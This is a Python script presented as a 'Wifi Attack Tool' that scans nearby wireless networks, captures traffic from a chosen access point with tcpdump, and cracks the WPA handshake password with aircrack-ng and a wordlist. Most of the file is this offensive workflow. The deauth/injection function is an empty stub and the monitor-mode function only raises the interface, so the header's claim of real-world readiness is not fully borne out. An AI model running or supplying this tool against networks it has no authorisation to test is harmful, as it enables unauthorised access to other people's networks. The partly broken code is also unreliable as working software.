###########################################################################################################################################################################################################
# Notice: ((This tool currently requires testing for deauth and frame injection functionality)): Run using python3 wifitest.py Script uses scapy and pyric: The script includes checking and installing necessary tools, setting the interface to monitor mode, 
# scanning for networks, capturing handshakes, and cracking the handshake using a wordlist. (( Needs to deauth to capture the handshake & look for workround for airodump-ng  ))
# This script includes necessary error handling and guides users through the process with clear feedback. It provides an interactive menu for network scanning, handshake capturing, and password cracking, 
# making it more user-friendly and functional for real-world use.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
###########################################################################################################################################################################################################

import subprocess
import sys
import time
from pyric import pyw
from scapy.all import *

def display_splash_screen():
    splash = """
    
    
 __      __.__  _____.__     _____   __    __                 __     ___________           .__                 _____ ______________  ___ ___    _____           _______  ____ 
/  \    /  \__|/ ____\__|   /  _  \_/  |__/  |______    ____ |  | __ \__    ___/___   ____ |  |               /  |  /_   \______   \/   |   \  /  |  |          \   _  \/_   |
\   \/\/   /  \   __\|  |  /  /_\  \   __\   __\__  \ _/ ___\|  |/ /   |    | /  _ \ /  _ \|  |     ______   /   |  ||   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 \        /|  ||  |  |  | /    |    \  |  |  |  / __ \\  \___|    <    |    |(  <_> |  <_> )  |__  /_____/  /    ^   /   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
  \__/\  / |__||__|  |__| \____|__  /__|  |__| (____  /\___  >__|_ \   |____| \____/ \____/|____/           \____   ||___||____|    \___|_  /\____   |           \_____  /___|
       \/                         \/                \/     \/     \/                                             |__|                     \/      |__|                 \/ 
 
                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)
   
 
"""

    print(splash)
    print("Wifi Attack Tool 41PH4-01\n")

def check_tool_installed(tool_name):
    try:
        subprocess.run([tool_name, "--help"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        print(f"{tool_name} is installed.")
    except subprocess.CalledProcessError:
        print(f"{tool_name} is not installed. Please install it and run the script again.")
        sys.exit(1)

def set_monitor_mode(interface):
    try:
        wireless = pyw.Wireless(interface)
        wireless.interface_up()
        print(f"Interface {interface} set to monitor mode.")
    except pyw.PyricError as e:
        print(f"Error setting interface to monitor mode: {e}")

def scan_networks(interface):
    networks = {}
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11Elt].info.decode()
            if bssid not in networks:
                networks[bssid] = ssid
                print(f"Found Network: BSSID: {bssid}, SSID: {ssid}")
    
    print("Scanning for networks. Press Ctrl+C to stop.")
    try:
        sniff(iface=interface, prn=packet_handler, timeout=30)
    except Exception as e:
        print(f"Error scanning networks: {e}")
    
    return networks

def capture_handshake(interface, bssid):
    print(f"Capturing handshake for BSSID: {bssid}")
    try:
        subprocess.run(["tcpdump", "-i", interface, "-w", "handshake-01.cap", "ether host", bssid], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error capturing handshake: {e}")

def inject_packets(interface, bssid):
    print(f"Injecting packets to BSSID: {bssid}")
    # You can implement packet injection using Scapy or other methods specific to your needs.
    # Example: sendp(RadioTap()/Dot11(type=0, subtype=5, addr1=bssid)/...)
    try:
        # Example: sendp(RadioTap()/Dot11(type=0, subtype=5, addr1=bssid)/...)
        pass
    except Exception as e:
        print(f"Error injecting packets: {e}")

def crack_handshake(wordlist):
    print(f"Cracking handshake using wordlist: {wordlist}")
    try:
        subprocess.run(["aircrack-ng", "-w", wordlist, "handshake-01.cap"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error cracking handshake: {e}")

def main():
    display_splash_screen()
    check_tool_installed("tcpdump")
    check_tool_installed("aircrack-ng")

    interface = input("Enter your wireless interface (e.g., wlan0): ")
    
    set_monitor_mode(interface)
    
    networks = scan_networks(interface)
    if networks:
        for i, (bssid, ssid) in enumerate(networks.items(), 1):
            print(f"{i}. BSSID: {bssid}, SSID: {ssid}")
        selection = input("Select the network by number: ")
        try:
            selection = int(selection) - 1
            bssid = list(networks.keys())[selection]
            print(f"Selected BSSID: {bssid}")
    
            capture_handshake(interface, bssid)
            inject_packets(interface, bssid)  # Optional
            wordlist = input("Enter the path to your wordlist: ")
            crack_handshake(wordlist)
    
        except (ValueError, IndexError) as e:
            print(f"Invalid selection: {e}")
    else:
        print("No networks found.")

if __name__ == "__main__":
    main()
